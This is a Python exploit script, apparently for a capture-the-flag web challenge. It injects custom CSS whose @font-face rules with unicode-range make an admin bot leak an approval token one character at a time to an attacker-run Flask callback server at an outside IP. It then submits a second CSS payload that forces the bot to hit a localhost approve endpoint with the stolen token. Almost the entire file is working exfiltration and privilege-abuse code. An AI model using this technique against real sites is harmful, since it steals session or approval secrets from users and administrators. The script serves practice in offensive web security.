#!/usr/bin/env python3
import requests
from flask import Flask, request

#  Use the real challenge URL
base_url = "http://94.237.53.203:56015"

#  Use your Pwnbox IP for callback (bot running locally will access this)
callback_url = "http://85.9.193.240:8080/leak/"

#  Replace with your real submission ID after submitting once
id_submission_to_approve = 1

#  This is the localhost URL the admin/bot uses internally
localhost_url = "http://127.0.0.1:1337"

app = Flask(__name__)
session = requests.Session()
leaked_chars = []

def submit(css):
    r = session.post(base_url + "/api/submission/submit", json={"customCSS": css})
    if r.status_code == 200:
        print("Submission sent", flush=True)

def build_css_leak():
    css = """
        #approvalToken {
            display: block !important;
            font-family: "leak";
        }
    """
    token_charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    for char in list(token_charset):
        css += """
        @font-face {{
            font-family: leak; 
            src: url({}{}); 
            unicode-range:U+{}; 
        }}
        """.format(callback_url, char, char.encode("unicode_escape").hex().zfill(4))
    return css

def build_css_approve(token):
    approve_url = localhost_url + "/approve/{}/{}".format(id_submission_to_approve, token)
    css = """
        #approvalToken {{
            display: block !important;
            font-family: "leak";
        }}
        @font-face {{
            font-family: leak; 
            src: url({});
        }}
    """.format(approve_url)
    return css

def assemble_token(char):
    leaked_chars.append(char)
    if len(leaked_chars) == 32:
        token = "".join(sorted(leaked_chars))
        print(" Token recovered: " + token, flush=True)
        leaked_chars.clear()
        accept_submission(token)

def accept_submission(token):
    css_approve = build_css_approve(token)
    submit(css_approve)

@app.route("/start")
def start():
    css = build_css_leak()
    submit(css)
    return " Submission sent for exfil"

@app.route("/leak/<char>")
def leak(char):
    print(f" Leaked char: {char}")
    assemble_token(char)
    return "", 200

if __name__ == "__main__":
    app.run("0.0.0.0", port=8080)
